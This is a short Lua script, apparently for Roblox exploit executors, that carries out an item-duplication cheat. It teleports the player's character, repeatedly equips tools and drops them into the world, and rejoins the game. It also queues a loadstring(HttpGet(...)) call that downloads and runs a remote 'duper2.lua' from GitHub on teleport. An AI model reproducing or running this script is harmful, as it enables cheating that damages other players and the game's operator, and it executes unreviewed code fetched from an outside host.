queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/ilikecheesemuchwow/eee/refs/heads/main/duper2.lua'))()")
    game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-42, 341, -281))
    for i, v in pairs(game:GetService("Players").LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
        if v:IsA("Tool") then
            v.Parent = game:GetService("Players").LocalPlayer.Character
            task.wait(0.3)
            v.Parent = game:GetService("Workspace")
        end
    end
    game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
